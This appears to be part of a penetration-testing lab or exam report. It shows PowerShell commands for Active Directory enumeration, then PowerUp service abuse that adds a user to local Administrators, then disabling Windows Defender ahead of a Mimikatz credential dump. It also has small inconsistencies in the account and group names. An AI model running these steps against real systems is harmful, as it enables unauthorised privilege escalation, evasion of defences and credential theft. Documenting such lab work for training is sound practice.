# Domain Enumeration
USER is a domain computer and we are authenticated with domain credentials. We can enumerate the 
domain using PowerShell ADSI.

All users
``` 
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(&(objectclass=user))"
$Searcher.SearchRoot = ''
$Searcher.FindAll()
```
all domain computers
```
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "(&(objectclass=computer))"
$Searcher.SearchRoot = ''
$Searcher.FindAll()
```
domain trusts
```
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAl
lTrustRelationships()
```
users with SPN
```
$Searcher = New-Object DirectoryServices.DirectorySearcher
$Searcher.Filter = "
(&(!(samaccountname=krbtgt))(objectclass=user)(objectcategory=user)(servicePr
incipalName=*))"
$Searcher.SearchRoot = ''
$Searcher.FindAll()
```

## Steps to compromise
Using an automated tool such as PowerUp1
, we can find misconfigurations such as service permissions 
or potentially hijackable DLL locations. Running Invoke-AllChecks will show us any vulnerabilities. As 
seen in the screenshot below we find a service named SensorDataService which has misconfigured 
permissions and our current user examAd can restart this service, allowing us to abuse it and add our 
user into the local Administrators group

```
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```
Running The following Command will add our current user (examAp) to the local administrator group

```
Invoke-ServiceAbuse -Name 'SensorDataService' -Username 'test\examAd'
```
We can verify our user has been added the Administrators group
```
net localgroup Administrator
```
Once we have Administrative Privileges on USER, we run Invoke-Mimikatz to dump credentials. But first 
let’s disable Windows Defender.
```
Set-MpPreference -DisableIOAVProtection $true
```
